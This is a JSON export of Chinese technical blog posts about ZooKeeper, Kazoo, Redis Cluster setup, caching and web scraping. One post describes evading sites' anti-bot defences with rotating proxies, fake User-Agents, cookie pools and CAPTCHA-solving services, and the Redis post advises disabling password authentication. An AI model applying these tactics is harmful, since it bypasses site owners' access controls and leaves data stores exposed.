width=\"12\"></td>\n\t\t\t<td>/:break</td>\n\t\t\t<td>分手</td>\n\t\t</tr><tr><td><img alt=\"生日\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82OC5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:cake</td>\n\t\t\t<td>生日</td>\n\t\t</tr><tr><td><img alt=\"电\" height=\"12\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ud3BqYW0uY29tL3dlaXhpbi1lbW90aW9ucy82OS5wbmc?x-oss-process=image/format,png\" width=\"12\"></td>\n\t\t\t<td>/:li</td>\n\t\t\t<td>电</td>\n\t\t</tr></tbody></table><hr><p> </p>\n                                    </div>", "log_PostTime": 1584891288, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "ZooKeeper简介和概念知识", "log_Intro": "ZooKeeper简介和概念知识", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"1-简介\">1. 简介</h2>\n\n<p><strong>ZooKeeper是一种分布式协调服务</strong>，用于管理大型主机。在分布式环境中协调和管理服务是一个复杂的过程。</p>\n\n<p>ZooKeeper通过其简单的架构和API解决了这个问题。ZooKeeper允许开发人员专注于核心应用程序逻辑，而不必担心应用程序的分布式特性。</p>\n\n<p>ZooKeeper框架最初是在“Yahoo!\"上构建的，用于以简单而稳健的方式访问他们的应用程序。 后来，Apache ZooKeeper成为Hadoop，HBase和其他分布式框架使用的有组织服务的标准。 例如，Apache HBase使用ZooKeeper跟踪分布式数据的状态。</p>\n\n<p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20200315145143654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<h2 id=\"2-概念知识\">2. 概念知识</h2>\n\n<p>层次命名空间</p>\n\n<p>下图描述了用于内存表示的ZooKeeper文件系统的树结构（ZooKeeper的数据保存形式）。ZooKeeper节点称为 <strong>znode</strong> 。每个znode由一个名称标识，并用路径(/)序列分隔。</p>\n\n<p><strong>每个znode最多可存储1MB的数据</strong>。</p>\n\n<p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/2020031514521327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>Znode的类型</p>\n\n<p>Znode被分为持久（persistent）节点，顺序（sequential）节点和临时（ephemeral）节点。</p>\n\n<ul><li><strong>持久节点</strong> - 即使在创建该特定znode的客户端断开连接后，持久节点仍然存在。默认情况下，除非另有说明，否则所有znode都是持久的。</li>\n\t<li><strong>临时节点</strong> - 客户端活跃时，临时节点就是有效的。当客户端与ZooKeeper集合断开连接时，临时节点会自动删除。因此，只有临时节点不允许有子节点。如果临时节点被删除，则下一个合适的节点将填充其位置。临时节点在leader选举中起着重要作用。</li>\n\t<li><strong>顺序节点</strong> - 顺序节点可以是持久的或临时的。当一个新的znode被创建为一个顺序节点时，ZooKeeper通过将10位的序列号附加到原始名称来设置znode的路径。例如，如果将具有路径 <strong>/myapp</strong> 的znode创建为顺序节点，则ZooKeeper会将路径更改为 <strong>/myapp0000000001</strong> ，并将下一个序列号设置为0000000002。如果两个顺序节点是同时创建的，那么ZooKeeper不会对每个znode使用相同的数字。顺序节点在锁定和同步中起重要作用。</li>\n</ul><p>Watches（监视）</p>\n\n<p>监视是一种简单的机制，使客户端收到关于ZooKeeper集合中的更改的通知。客户端可以在读取特定znode时设置Watches。Watches会向注册的客户端发送任何znode（客户端注册表）更改的通知。</p>\n\n<p>Znode更改是与znode相关的数据的修改或znode的子项中的更改。只触发一次watches。如果客户端想要再次通知，则必须通过另一个读取操作来完成。当连接会话过期时，客户端将与服务器断开连接，相关的watches也将被删除。</p>\n                                    </div>", "log_PostTime": 1584891290, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "ZooKeeper安装", "log_Intro": "ZooKeeper安装", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>在安装ZooKeeper之前，请确保你的系统是在以下任一操作系统上运行：</p>\n\n<ul><li><strong>任意Linux OS</strong> - 支持开发和部署。适合演示应用程序。</li>\n\t<li><strong>Windows OS</strong> - 仅支持开发。</li>\n\t<li><strong>Mac OS</strong> - 仅支持开发。</li>\n</ul><p>ZooKeeper服务器是用Java创建的，它在JVM上运行。你需要使用JDK 6或更高版本。</p>\n\n<p>现在，按照以下步骤在你的机器上安装ZooKeeper框架。</p>\n\n<h2 id=\"步骤1：验证java安装\">步骤1：验证Java安装</h2>\n\n<p>相信你已经在系统上安装了Java环境。现在只需使用以下命令验证它。</p>\n\n<pre>\n<code>$ java -version\n</code></pre>\n\n<p>如果你在机器上安装了Java，那么可以看到已安装的Java的版本。否则，请按照以下简单步骤安装最新版本的Java。</p>\n\n<h3 id=\"步骤11：下载jdk\">步骤1.1：下载JDK</h3>\n\n<p>通过访问链接下载最新版本的JDK，并下载最新版本的<a href=\"https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\" rel=\"nofollow\">Java</a>。</p>\n\n<h3 id=\"步骤12：提取文件\">步骤1.2：提取文件</h3>\n\n<p>通常，文件会下载到<strong>download</strong>文件夹中。验证并使用以下命令提取tar设置。</p>\n\n<pre>\n<code>$ cd /path/to/download/\n$ tar -zxvf jdk-8u181-linux-x64.gz\n</code></pre>\n\n<h3 id=\"步骤13：移动到usrlocaljdk目录\">步骤1.3：移动到/usr/local/jdk目录</h3>\n\n<p>要使Java对所有用户可用，请将提取的Java内容移动到“/usr/local/jdk\"文件夹。</p>\n\n<pre>\n<code>$ sudo mkdir /usr/local/jdk\n$ sudo mv jdk1.8.0_181 /usr/local/jdk\n</code></pre>\n\n<h3 id=\"步骤14：设置路径\">步骤1.4：设置路径</h3>\n\n<p>要设置路径和JAVA_HOME变量，请将以下命令添加到〜/.bashrc文件中。</p>\n\n<pre>\n<code>export JAVA_HOME=/usr/local/jdk/jdk1.8.0_181\nexport PATH=$PATH:$JAVA_HOME/bin\n</code></pre>\n\n<p>现在，将所有更改应用到当前运行的系统中。</p>\n\n<pre>\n<code>$ source ~/.bashrc\n</code></pre>\n\n<h3 id=\"步骤15\">步骤1.5</h3>\n\n<p>使用步骤1中说明的验证命令<strong>(java -version)</strong>验证Java安装。</p>\n\n<h2 id=\"步骤2：zookeeper框架安装\">步骤2：ZooKeeper框架安装</h2>\n\n<h3 id=\"步骤21：下载zookeeper\">步骤2.1：下载ZooKeeper</h3>\n\n<p>要在你的计算机上安装ZooKeeper框架，请访问以下链接并下载最新版本的ZooKeeper。<a href=\"http://zookeeper.apache.org/releases.html\" rel=\"nofollow\">http://zookeeper.apache.org/releases.html</a></p>\n\n<p>到目前为止，最新版本的ZooKeeper是3.4.12(ZooKeeper-3.4.12.tar.gz)。</p>\n\n<h3 id=\"步骤22：提取tar文件\">步骤2.2：提取tar文件</h3>\n\n<p>使用以下命令提取tar文件</p>\n\n<pre>\n<code>$ cd /path/to/download/\n$ tar -zxvf zookeeper-3.4.12.tar.gz\n$ cd zookeeper-3.4.12\n$ mkdir data\n</code></pre>\n\n<h3 id=\"步骤23：创建配置文件\">步骤2.3：创建配置文件</h3>\n\n<p>使用命令 <strong>vi conf/zoo.cfg</strong> 和所有以下参数设置为起点，打开名为 <strong>conf/zoo.cfg</strong> 的配置文件。</p>\n\n<pre>\n<code>$ vi conf/zoo.cfg\n\ntickTime = 2000\ndataDir = /path/to/zookeeper/data\nclientPort = 2181\n</code></pre>\n\n<p>一旦成功保存配置文件，再次返回终端。你现在可以启动zookeeper服务器。</p>\n\n<h3 id=\"步骤24：启动zookeeper服务器\">步骤2.4：启动ZooKeeper服务器</h3>\n\n<p>执行以下命令</p>\n\n<pre>\n<code>$ bin/zkServer.sh start\n</code></pre>\n\n<p>执行此命令后，你将收到以下响应</p>\n\n<pre>\n<code>$ JMX enabled by default\n$ Using config: /Users/../zookeeper-3.4.12/bin/../conf/zoo.cfg\n$ Starting zookeeper ... STARTED\n</code></pre>\n\n<h3 id=\"步骤25：启动cli\">步骤2.5：启动CLI</h3>\n\n<p>键入以下命令</p>\n\n<pre>\n<code>$ bin/zkCli.sh\n</code></pre>\n\n<p>键入上述命令后，将连接到ZooKeeper服务器，你应该得到以下响应。</p>\n\n<pre>\n<code>Connecting to localhost:2181\n................\n................\n................\nWelcome to ZooKeeper!\n................\n................\nWATCHER::\nWatchedEvent state:SyncConnected type: None path:null\n[zk: localhost:2181(CONNECTED) 0]\n</code></pre>\n\n<h3 id=\"停止zookeeper服务器\">停止ZooKeeper服务器</h3>\n\n<p>连接服务器并执行所有操作后，可以使用以下命令停止zookeeper服务器。</p>\n\n<pre>\n<code>$ bin/zkServer.sh stop</code></pre>\n                                    </div>", "log_PostTime": 1584891291, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Kazoo安装和使用", "log_Intro": "Kazoo安装和使用", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>kazoo是Python连接操作ZooKeeper的客户端库。我们可以通过kazoo来使用ZooKeeper。</p>\n\n<h2 id=\"1-安装\">1. 安装</h2>\n\n<pre>\n<code>pip install kazoo\n</code></pre>\n\n<h2 id=\"2-使用\">2. 使用</h2>\n\n<p>连接ZooKeeper</p>\n\n<pre>\n<code>from kazoo.client import KazooClient\n\nzk = KazooClient(hosts='127.0.0.1:2181')\n\n# 启动连接\nzk.start() \n\n# 停止连接\nzk.stop()\n</code></pre>\n\n<p>创建节点</p>\n\n<pre>\n<code># 创建节点路径，但不能设置节点数据值\nzk.ensure_path(\"/my/favorite\")\n\n# 创建节点，并设置节点保存数据，ephemeral表示是否是临时节点，sequence表示是否是顺序节点\nzk.create(\"/my/favorite/node\", b\"a value\", ephemeral=True, sequence=True)\n</code></pre>\n\n<p>读取节点</p>\n\n<pre>\n<code># 获取子节点列表\nchildren = zk.get_children(\"/my/favorite\")\n\n# 获取节点数据data 和节点状态stat\ndata, stat = zk.get(\"/my/favorite\")\n</code></pre>\n\n<p>设置监视</p>\n\n<pre>\n<code>def my_func(event):\n    # 检查最新的节点数据\n\n# 当子节点发生变化的时候，调用my_func\nchildren = zk.get_children(\"/my/favorite/node\", watch=my_func)</code></pre>\n                                    </div>", "log_PostTime": 1584891292, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python反爬研究总结", "log_Intro": "Python反爬研究总结", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"反爬虫常见套路\">反爬虫常见套路</h2>\n\n<ol><li>\n\t<p>判断user-agent</p>\n\t</li>\n\t<li>\n\t<p>校验referer头</p>\n\t</li>\n\t<li>\n\t<p>校验cookie</p>\n\t</li>\n\t<li>\n\t<p>同一IP访问次数限制</p>\n\t</li>\n\t<li>\n\t<p>js/ajax动态渲染页面</p>\n\t</li>\n</ol><h2 id=\"反反爬虫应对策略\">反反爬虫应对策略</h2>\n\n<h3 id=\"1、user-agent头校验\">1、user-agent头校验</h3>\n\n<p>每次请求设置随机user-agent头。可以引入<code>fake_useragent</code>模块或从<a href=\"http://useragentstring.com/pages/useragentstring.php?typ=browser\" rel=\"nofollow\">http://useragentstring.com/pages/useragentstring.php?typ=browser</a>获取最新请求头。</p>\n\n<p>通过scrapy框架实现，<code>download_middleware</code>中间件，<code>process_request</code>方法。示例：</p>\n\n<pre>\n<code># 自定义User-Agent列表\nrequest.headers['User-Agent'] = random.choice(USER_AGENTS)\n\n# fake_useragent方式实现\nfrom fake_useragent import UserAgent\nrequest.headers['User-Agent'] = str(UserAgent().random)</code></pre>\n\n<h3 id=\"2、校验referer头\">2、校验referer头</h3>\n\n<ol><li>\n\t<p>设置referer为网站主域名</p>\n\t</li>\n\t<li>\n\t<p>通过selenium爬取，selenium会自动为每次请求增加referer头</p>\n\t</li>\n</ol><h3 id=\"3、校验cookie\">3、校验cookie</h3>\n\n<p>对方的网站的cookie规则无法分析/破解难度太大。可以通过<code>selenium/splash</code>处理对cookie的操作，建立cookie池</p>\n\n<h3 id=\"4、同一ip访问次数限制\">4、同一ip访问次数限制</h3>\n\n<p>如果同一个ip在某个时间段访问频次过高，会被认为是爬虫，封掉ip。解决办法：</p>\n\n<p>1.使用代理ip</p>\n\n<pre>\n<code>1) 批量获取ip，构成ip池\n2) 分次请求代理ip接口，每次请求一条ip，获取ip和过期时间\n</code></pre>\n\n<p>scrapy实现方式，<code>download_middleware</code>中间件，<code>process_request</code>方法。示例：</p>\n\n<pre>\n<code>request.meta['proxy'] = proxy</code></pre>\n\n<p>2.设置抓取频率</p>\n\n<p>修改scrapy settings文件</p>\n\n<pre>\n<code># 设置下载延迟 3s\nDOWNLOAD_DELAY = 3</code></pre>\n\n<p>代理平台对比</p>\n\n<table><thead><tr><th>指标平台</th>\n\t\t\t<th>芝麻代理</th>\n\t\t\t<th>快代理</th>\n\t\t\t<th>...</th>\n\t\t</tr></thead><tbody><tr><td>稳定性</td>\n\t\t\t<td>中（测试过程中，未发现代理不能用的情况）</td>\n\t\t\t<td>未使用，不明确</td>\n\t\t\t<td>...</td>\n\t\t</tr><tr><td>灵活性</td>\n\t\t\t<td>高（参数配置灵活，通过url调用）</td>\n\t\t\t<td>未使用，不明确</td>\n\t\t\t<td>...</td>\n\t\t</tr></tbody></table><h3 id=\"5、js/ajax动态渲染页面\">5、js/ajax动态渲染页面</h3>\n\n<p>此类网站可以通过<code>selenium</code>或者<code>splash</code>工具来进行处理。各自优缺点对比：</p>\n\n<table><thead><tr><th>指标工具</th>\n\t\t\t<th>selenium</th>\n\t\t\t<th>splash</th>\n\t\t</tr></thead><tbody><tr><td>性能</td>\n\t\t\t<td>低(每次请求需页面加载完才能进行下一步处理)</td>\n\t\t\t<td>高（Twisted和QT，发挥webkit并发能力）</td>\n\t\t</tr><tr><td>效率</td>\n\t\t\t<td>低(模拟浏览器，浏览器底层初始化一些流程)</td>\n\t\t\t<td>高（Twisted和QT，发挥webkit并发能力）</td>\n\t\t</tr><tr><td>运维成本</td>\n\t\t\t<td>低（作为scrapy一个类库调用）</td>\n\t\t\t<td>高（需配合docker使用，开启docker-splash服务）</td>\n\t\t</tr><tr><td>内存</td>\n\t\t\t<td>高（随时间推移，占用内存越高）</td>\n\t\t\t<td>待测试...</td>\n\t\t</tr><tr><td>灵活性</td>\n\t\t\t<td>中</td>\n\t\t\t<td>高（参数配置方便）</td>\n\t\t</tr><tr><td>使用范围</td>\n\t\t\t<td>浏览器测试自动化工具</td>\n\t\t\t<td>异步渲染页面</td>\n\t\t</tr></tbody></table><p>综上所述，爬取动态页面数据，在效率以及爬取性能上，splash会有明显优势。</p>\n\n<h2 id=\"&amp;Question\">&amp;Question</h2>\n\n<h3 id=\"1、如何确保100%爬取？\">1、如何确保100%爬取？</h3>\n\n<p>1、代理ip稳定</p>\n\n<p>2、建立失败请求重试机制</p>\n\n<h3 id=\"2、代理ip被对方网站封掉如何处理？（重试机制？）\">2、代理ip被对方网站封掉如何处理？（重试机制？）</h3>\n\n<p>通过scrapy框架<code>download_middleware</code>中间件，<code>process_response</code>方法来判断返回参数进行处理。示例：</p>\n\n<pre>\n<code>    def process_response(self, request, response, spider):\n        \n        # 判断response状态码 或 返回内容为验证码，则获取新的代理ip\n        if response.status != 200:\n            self.logger.info('ip被拉黑')\n            \n            # 更新代理ip\n            self.update_proxy()\n            \n            # 返回request对象 重新发起请求\n            return request\n\n        # 返回response到爬虫脚本\n        return response</code></pre>\n\n<p>也可以作为重试机制之一。</p>\n\n<h3 id=\"3、selenium代理设置问题及替代方案\">3、selenium代理设置问题及替代方案</h3>\n\n<p>通过资料查找以及实践踩坑发现selenium对于代理ip的设置不太友好，而且如何动态切换代理ip也是个问题（也可以实现）。</p>\n\n<p>splash设置动态ip比较方便。示例：</p>\n\n<ol><li>\n\t<p>中间件实现</p>\n\t</li>\n</ol><pre>\n<code>class ProxyMiddleware(object):\n      def process_request(self, request, spider):\n          request.meta['splash']['args']['proxy'] = proxyServer\n          proxy_user_pass = \"USERNAME:PASSWORD\"\n          encoded_user_pass = base64.encodestring(proxy_user_pass)\n          request.headers[\"Proxy-Authorization\"] = 'Basic ' + encoded_user_pass\n</code></pre>\n\n<ol><li>\n\t<p>spider实现</p>\n\t</li>\n</ol><pre>\n<code>def start_requests(self):\n    for url in self.start_urls:\n        yield SplashRequest(url,\n            url=url,\n            callback=self.parse,\n            args={\n                   'wait': 5,\n                   'proxy': 'http://proxy_ip:proxy_port'\n            }\n</code></pre>\n\n<h3 id=\"4、验证码问题\">4、验证码问题</h3>\n\n<ol><li>\n\t<p>手动认证（效率太低... 需要人工</p>\n\t</li>\n\t<li>\n\t<p>更换ip (方便</p>\n\t</li>\n\t<li>\n\t<p>打码平台 (一般的识别验证码类库不稳定，打码平台一般都需要收费</p>\n\t</li>\n</ol><p>选择哪个，哪种方式更适合，需要测试以及项目需求才能确定。</p>\n\n<h3 id=\"5、如何高效抓取\">5、如何高效抓取</h3>\n\n<ol><li>\n\t<p>破解对方ajax请求，通过ajax请求获取数据，不走页面</p>\n\t</li>\n\t<li>\n\t<p>mysql连接池（Twisted、adbapi）</p>\n\t</li>\n\t<li>\n\t<p>Redis分布式爬虫（Spider.Redis）</p>\n\t</li>\n\t<li>\n\t<p>数据写入redis或MongoDB，异步读入mysql</p>\n\t</li>\n</ol><h3 id=\"6、Splash\">6、Splash</h3>\n\n<p>这里以亚马逊为例，爬取亚马逊，使用Splash没有用selenium好，使用splash总是会出现响应丢失的情况，估计是响应时间太长了，后续还需要更加完善的测试。</p>\n\n<h2 id=\"scrapy实践项目地址\"> </h2>\n\n<h2 id=\"预选方案\">预选方案</h2>\n\n<p>splash + 代理ip + 随机user_agent + cookie池 + 分布式爬虫</p>\n                                    </div>", "log_PostTime": 1584891293, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Redis高可用集群Redis Cluster搭建", "log_Intro": "Redis高可用集群Redis Cluster搭建", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>前言：</strong></p>\n\n<p>       Redis3.0版本之前，可以通过Redis Sentinel（哨兵）来实现高可用 ( HA )，从3.0版本之后，官方推出了Redis Cluster，它的主要用途是实现数据分片(Data Sharding)，不过同样可以实现HA，是官方当前推荐的方案。</p>\n\n<p>       在Redis Sentinel模式中，每个节点需要保存全量数据，冗余比较多，而在Redis Cluster模式中，每个分片只需要保存一部分的数据，对于内存数据库来说，还是要尽量的减少冗余。在数据量太大的情况下，故障恢复需要较长时间，另外，内存实在是太贵了。。。</p>\n\n<p>       Redis Cluster的具体实现细节是采用了Hash槽的概念，集群会预先分配16384个槽，并将这些槽分配给具体的服务节点，通过对Key进行CRC16(key)%16384运算得到对应的槽是哪一个，从而将读写操作转发到该槽所对应的服务节点。当有新的节点加入或者移除的时候，再来迁移这些槽以及其对应的数据。在这种设计之下，我们就可以很方便的进行动态扩容或缩容，个人也比较倾向于这种集群模式。</p>\n\n<p><img alt=\"\" class=\"has\" height=\"356\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9vc2NpbWcub3NjaGluYS5uZXQvb3NjbmV0LzlkNTMzMTY1MzE1NDc0NWNhMmVlMWI3MTZhNmQ2NjdkZjMzLmpwZw?x-oss-process=image/format,png\" width=\"823\"></p>\n\n<p>传送门：<a href=\"https://redis.io/topics/cluster-tutorial\" rel=\"nofollow\">Redis Cluster官方介绍</a></p>\n\n<p>   当然，关于高可用的实现方案，也可以将这两种模式结合起来使用，不过比较复杂，不太推荐。</p>\n\n<p><strong>安装Redis：</strong></p>\n\n<p>       关于Redis的具体安装步骤，这里就不再赘述了，由于Redis Cluster 模式需要3.0以上的版本支持，因此请确保您的Redis版本是3.0以上的。</p>\n\n<p>查看Redis版本号：</p>\n\n<pre class=\"has\">\n<code>[root@VM_0_15_centos src]# ./redis-cli -p 8002 info server</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9vc2NpbWcub3NjaGluYS5uZXQvb3NjbmV0LzA2M2QxOWVjMjViMDljNGUwYWFmZDE3NjY3NjM2NTExZTE3LmpwZw?x-oss-process=image/format,png\"></p>\n\n<p><strong>搭建集群:</strong></p>\n\n<p>       Redis Cluster集群至少需要三个master节点，本文将以单机多实例的方式部署3个主节点及3个从节点，6个节点实例分别使用不同的端口及工作目录</p>\n\n<p>1. 首先，在redis安装目录/usr/local/redis-4.0.6下新建目录redis-cluster，并在该目录下再新建6个子目录，8001,8002,8003,8004,8005,8006，此时目录结构如下图所示：</p>\n\n<pre class=\"has\">\n<code>[root@VM_0_15_centos redis-cluster]# pwd\n/usr/local/redis-4.0.6/redis-cluster\n[root@VM_0_15_centos redis-cluster]# ll\ntotal 24\ndrwxr-xr-x 2 root root 4096 Jul  7 18:42 8001\ndrwxr-xr-x 2 root root 4096 Jul  7 18:42 8002\ndrwxr-xr-x 2 root root 4096 Jul  7 18:42 8003\ndrwxr-xr-x 2 root root 4096 Jul  7 18:42 8004\ndrwxr-xr-x 2 root root 4096 Jul  7 18:42 8005\ndrwxr-xr-x 2 root root 4096 Jul  7 18:42 8006</code></pre>\n\n<p>2. 将redis安装目录/usr/local/redis-4.0.6下的redis.conf文件拷贝至8001文件夹，并修改以下配置：</p>\n\n<pre class=\"has\">\n<code>daemonize yes #开启后台运行\nport 8001 #工作端口\nbind 172.16.0.15 #绑定机器的内网IP,一定要设置呀老铁，不要用127.0.0.1\ndir /usr/local/redis-cluster/8001/ #指定工作目录，rdb,aof持久化文件将会放在该目录下，不同实例一定要配置不同的工作目录\ncluster-enabled yes #启用集群模式\ncluster-config-file nodes-8001.conf #生成的集群配置文件名称，集群搭建成功后会自动生成，在工作目录下\ncluster-node-timeout 5000 #节点宕机发现时间，可以理解为主节点宕机后从节点升级为主节点时间\nappendonly yes #开启AOF模式\npidfile /var/run/redis_8001.pid #pid file所在目录</code></pre>\n\n<p>3. 把8001文件夹下的redis.conf文件拷贝到其他5个目录，并重新修改port 、dir、cluster-config-file 三个属性</p>\n\n<p>这里可以使用sed命令快速修改</p>\n\n<pre class=\"has\">\n<code>[root@VM_0_15_centos redis-cluster]# sed -i 's/8001/8002/g' 8002/redis.conf\n[root@VM_0_15_centos redis-cluster]# sed -i 's/8001/8003/g' 8003/redis.conf\n[root@VM_0_15_centos redis-cluster]# sed -i 's/8001/8004/g' 8004/redis.conf\n[root@VM_0_15_centos redis-cluster]# sed -i 's/8001/8005/g' 8005/redis.conf\n[root@VM_0_15_centos redis-cluster]# sed -i 's/8001/8006/g' 8006/redis.conf</code></pre>\n\n<p>4. 由于创建集群需要用到redis-trib这个命令，它依赖Ruby和RubyGems，因此我们要先安装一下</p>\n\n<pre class=\"has\">\n<code>[root@VM_0_15_centos redis-cluster]# yum install ruby\n[root@VM_0_15_centos redis-cluster]# yum install rubygems\n[root@VM_0_15_centos redis-cluster]# gem install redis --version 3.3.3</code></pre>\n\n<p>5. Ruby安装完成之后，我们开始启动6个节点</p>\n\n<pre class=\"has\">\n<code>[root@VM_0_15_centos redis-4.0.6]# ./src/redis-server redis-cluster/8001/redis.conf\n[root@VM_0_15_centos redis-4.0.6]# ./src/redis-server redis-cluster/8002/redis.conf\n[root@VM_0_15_centos redis-4.0.6]# ./src/redis-server redis-cluster/8003/redis.conf\n[root@VM_0_15_centos redis-4.0.6]# ./src/redis-server redis-cluster/8004/redis.conf\n[root@VM_0_15_centos redis-4.0.6]# ./src/redis-server redis-cluster/8005/redis.conf\n[root@VM_0_15_centos redis-4.0.6]# ./src/redis-server redis-cluster/8006/redis.conf</code></pre>\n\n<p>6.查看一下服务是否正常起来了</p>\n\n<pre class=\"has\">\n<code>[root@VM_0_15_centos redis-4.0.6]# ps -ef|grep redis\nroot     20290     1  0 18:33 ?        00:00:02 ./src/redis-server *:8001 [cluster]\nroot     20295     1  0 18:33 ?        00:00:02 ./src/redis-server *:8002 [cluster]\nroot     20300     1  0 18:33 ?        00:00:02 ./src/redis-server *:8003 [cluster]\nroot     20305     1  0 18:33 ?        00:00:02 ./src/redis-server *:8004 [cluster]\nroot     20310     1  0 18:33 ?        00:00:02 ./src/redis-server *:8005 [cluster]\nroot     20312     1  0 18:33 ?        00:00:02 ./src/redis-server *:8006 [cluster]\nroot     22913 15679  0 19:31 pts/2    00:00:00 grep --color=auto redis</code></pre>\n\n<p>ok，6个节点都已经正常启动。</p>\n\n<p>7. 开始创建集群</p>\n\n<pre class=\"has\">\n<code>[root@VM_0_15_centos redis-4.0.6]# ./src/redis-trib.rb create --replicas 1 172.16.0.15:8001 172.16.0.15:8002 172.16.0.15:8003 172.16.0.15:8004 172.16.0.15:8005 172.16.0.15:8006</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9vc2NpbWcub3NjaGluYS5uZXQvb3NjbmV0LzVhYWVlNjU2ZjMwNjQ3MzVjZWY5ZDcxZmUxMTlhODEyYzExLmpwZw?x-oss-process=image/format,png\"></p>\n\n<p>由控制台可以看到，集群已经创建完毕，那么我们到8001这个节点看一下集群节点状态</p>\n\n<pre class=\"has\">\n<code>172.16.0.15:8001&gt; cluster nodes\n068ac2afe1ade8b69b83226453fecc2b79cd93ae 172.16.0.15:8004@18004 slave 421ebe9e0a5ac6c811935ecd9dba83ef119dec17 0 1531008204920 4 connected\n784c727c83a5952d3714ac211021f909cc4dfee4 172.16.0.15:8005@18005 slave eb5d700e2f030c02fb1f30ba4420d0b4f7170d84 0 1531008203000 5 connected\n0537099e7cc7ab595c7aad5f0c96985251b85ec0 172.16.0.15:8006@18006 slave 79262341417df0a11eaf31e72bbf3e26f5f60ebf 0 1531008204419 6 connected\n421ebe9e0a5ac6c811935ecd9dba83ef119dec17 172.16.0.15:8001@18001 myself,master - 0 1531008204000 1 connected 0-5460\neb5d700e2f030c02fb1f30ba4420d0b4f7170d84 172.16.0.15:8002@18002 master - 0 1531008203000 2 connected 5461-10922\n79262341417df0a11eaf31e72bbf3e26f5f60ebf 172.16.0.15:8003@18003 master - 0 1531008203419 3 connected 10923-16383</code></pre>\n\n<p>控制台信息显示: 当前集群中存在3个主节点和3个从节点，说明我们的集群已经搭建成功</p>\n\n<p>至此，Redis Cluster集群就搭建完成了！</p>\n\n<p><strong>Tips :</strong></p>\n\n<p>1. 如果想重新创建集群，需要登录到每个节点，执行flushdb，然后执行cluster reset，重启节点；</p>\n\n<p>2. 如果要批量杀掉Redis进程，可以使用pkill redis-server命令；</p>\n\n<p>3. 如果redis开启了密码认证，则需要在redis.conf中增加属性 : masterauth yourpassword ，并且需要修改/usr/local/share/gems/gems/redis-3.3.3/lib/redis目录下的client.rb文件，将password属性设置为redis.conf中的requirepass的值，不同的操作系统client.rb的位置可能不一样，可以使用 find / -name \"client.rb\"全盘查找一下；</p>\n\n<pre class=\"has\">\n<code> DEFAULTS = {\n      :url =&gt; lambda { ENV[\"REDIS_URL\"] },\n      :scheme =&gt; \"redis\",\n      :host =&gt; \"127.0.0.1\",\n      :port =&gt; 6379,\n      :path =&gt; nil,\n      :timeout =&gt; 5.0,\n      :password =&gt; \"yourpassword\",\n      :db =&gt; 0,\n      :driver =&gt; nil,\n      :id =&gt; nil,\n      :tcp_keepalive =&gt; 0,\n      :reconnect_attempts =&gt; 1,\n      :inherit_socket =&gt; false\n    }</code></pre>\n\n<p>4. Redis开启密码认证后，在集群操作时问题会比较多，因此建议不要开启密码认证，搭配使用防火墙保证Redis的安全。</p>\n                                    </div>", "log_PostTime": 1584891295, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Cache Aside Pattern（缓存模式）", "log_Intro": "Cache Aside Pattern（缓存模式）", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>本文主要讨论这么几个问题：<br>\n（1）“缓存与数据库”需求缘起<br>\n（2）“淘汰缓存”还是“更新缓存”<br>\n（3）缓存和数据库的操作时序<br><br><br><strong>一、需求缘起</strong><br>\n　　场景介绍<br>\n　　缓存是一种提高系统读性能的常见技术，对于读多写少的应用场景，我们经常使用缓存来进行优化。例如对于用户的余额信息表account(uid, money)，业务上的需求是：<br>\n　　（1）查询用户的余额，SELECT money FROM account WHERE uid=XXX，占99%的请求<br>\n　　（2）更改用户余额，UPDATE account SET money=XXX WHERE uid=XXX，占1%的请求<br>\n　　由于大部分的请求是查询，我们在缓存中建立uid到money的键值对，能够极大降低数据库的压力。<br><br>\n　　读操作流程<br>\n　　有了数据库和缓存两个地方存放数据之后（uid-&gt;money），每当需要读取相关数据时（money），操作流程一般是这样的：<br>\n　　（1）读取缓存中是否有相关数据，uid-&gt;money<br>\n　　（2）如果缓存中有相关数据money，则返回【这就是所谓的数据命中“hit”】<br>\n　　（3）如果缓存中没有相关数据money，则从数据库读取相关数据money【这就是所谓的数据未命中“miss”】，放入缓存中uid-&gt;money，再返回<br>\n缓存的命中率 = 命中缓存请求个数/总缓存访问请求个数 = hit/(hit+miss)<br>\n上面举例的余额场景，99%的读，1%的写，这个缓存的命中率是非常高的，会在95%以上。<br><br>\n　　那么问题来了，当数据money发生变化的时候：<br>\n　　（1）是更新缓存中的数据，还是淘汰缓存中的数据呢？<br>\n　　